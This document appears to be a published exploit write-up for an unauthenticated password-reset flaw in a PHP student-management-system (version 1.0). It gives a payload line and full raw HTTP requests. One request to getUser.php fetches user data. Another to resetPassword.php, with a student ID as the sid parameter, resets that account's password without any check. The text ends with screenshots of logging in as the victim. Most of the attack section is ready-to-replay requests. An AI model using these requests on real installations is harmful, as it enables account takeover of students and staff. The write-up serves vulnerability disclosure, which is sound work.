# student-management-system resetPassword.php user password reset

   
#### Exploit Title: student-management-system resetPassword.php user password reset
#### Exploit Author: webraybtl@webray.com.cn inc
#### Vendor Homepage: https://github.com/ningzichun/student-management-system
#### Software Link: https://github.com/ningzichun/student-management-system
#### Version: student-management-system 1.0
#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description
The step of modifying the password was not verified, resulting in the ability to directly enter the website where the final password was modified, directly redirect to the page, and then enter a new password to reset the password, resulting in a everybody password reset student-management-system does not filter the content correctly at the "resetPassword.php" sid module, resulting in anyone password reset.

#### Payload used:
test account:201600012489
`/resetPassword.php?sid=xxxx`

#### Proof of Concept


1. Open login.php source code.

![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/6013b5bb-e0ed-4124-8d72-34522bfcd10c)
2. request a getUser.php response.
```
GET /student/admin/fun/getUser.php HTTP/1.1
Host: 172.24.6.107:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Origin: http://172.24.6.107:8081
Connection: close
Referer: http://172.24.6.107:8081/student/?retry=1
Cookie: PHPSESSID=
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache


```
![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/be8169a9-efe5-40b2-a564-b65eb70a74fa)


3. request a resetPassword.php response.

![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/87ea04ff-66f3-4b95-9ad9-9077942f913d)

```
GET /student/admin/fun/resetPassword.php?sid=201600012489 HTTP/1.1
Host: 172.24.6.107:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Origin: http://172.24.6.107:8081
Connection: close
Referer: http://172.24.6.107:8081/student/?retry=1
Cookie: PHPSESSID=
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

```

4. user login

![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/d8aa4339-95c7-488a-96ea-b89c31f0eb54)
![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/aefb7b99-80b4-45b5-90b9-b317262aba95)



